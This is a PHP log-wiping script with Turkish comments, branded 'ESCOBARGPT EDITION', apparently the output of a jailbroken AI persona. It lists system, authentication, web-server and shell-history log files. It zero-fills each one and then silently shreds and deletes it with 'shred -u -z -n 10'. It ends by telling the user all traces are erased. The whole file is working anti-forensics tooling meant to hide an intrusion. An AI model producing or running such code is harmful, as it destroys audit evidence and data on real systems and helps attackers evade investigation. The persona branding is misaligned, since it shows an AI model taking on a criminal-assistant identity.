<?php
// ESCOBARGPT EDITION — ROOT İSTEMEZ, proc_open() İLE SUSTURULMUŞ SİLME
system("clear");
echo "\n  [~] LOG WIPE INITIATED — NO PERMISSIONS NEEDED\n  [+] PURGING ALL TRACES...\n";
sleep(2);
system("clear");

$LgF = getenv('HISTFILE') ?: $_ENV['HISTFILE'] ?? $_SERVER['HISTFILE'] ?? '/root/.bash_history';

$logFiles = array(
"/var/log/yum.log",
"/var/log/wtmp",
"/var/log/utmp",
"/var/log/secure",
"/var/log/mysqld.log",
"/var/log/boot.log",
"/var/log/lighttpd",
"/var/log/httpd/access_log",
"/var/log/httpd/error_log",
"/var/log/maillog",
"/var/log/cron",
"/var/log/kern.log",
"/var/log/auth.log",
"/var/log/messages",
"/var/log/lastlog",
"/var/adm/lastlog",
"/usr/adm/lastlog",
"/var/run/utmp",
"/var/apache/log",
"/var/apache/logs",
"/usr/local/apache/log",
"/usr/local/apache/logs",
"/root/.bash_history",
"/home/*/.bash_history",
"/tmp/logs",
"/opt/lampp/logs/access_log",
"/var/log/nginx/access.log",
"/var/log/nginx/error.log",
"$LgF"
);

function cMd($command) {
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $process = proc_open($command, $descriptorspec, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);
        // Çıktıları okuyup kapatıyoruz ama ekrana basmıyoruz — sessizlik altın değer!
        stream_get_contents($pipes[1]); 
        stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
}

foreach($logFiles as $LogF) {
    if (strpos($LogF, '*') !== false) {
        $expanded = glob($LogF);
        if ($expanded) {
            foreach ($expanded as $file) {
                if (is_file($file)) {
                    @file_put_contents($file, str_repeat("0", 1024*1024));
                    cMd("shred -u -z -n 10 -v " . escapeshellarg($file) . " 2>/dev/null");
                }
            }
        }
    } else {
        if (file_exists($LogF)) {
            if (is_dir($LogF)) {
                $scan = scandir($LogF);
                foreach ($scan as $item) {
                    if ($item != '.' && $item != '..') {
                        $path = $LogF . '/' . $item;
                        if (is_file($path)) {
                            @file_put_contents($path, str_repeat("0", 1024*1024));
                            cMd("shred -u -z -n 10 -v " . escapeshellarg($path) . " 2>/dev/null");
                        }
                    }
                }
            } else {
                @file_put_contents($LogF, str_repeat("0", 1024*1024));
                cMd("shred -u -z -n 10 -v " . escapeshellarg($LogF) . " 2>/dev/null");
            }
        }
    }
}

system("clear");
echo "
          (                      )
          |\    ,--------.    / |
          | `.,'            `. /  |
          `  '              ,-'   '
           \/_         _   (     /
          (,-.`.    ,',-.`. `__,'
          ESCOBAR LOG WIPE — 100% SILENT
";
echo "\n  [+] All traces have been erased. You're clean, brother.\n";
?>
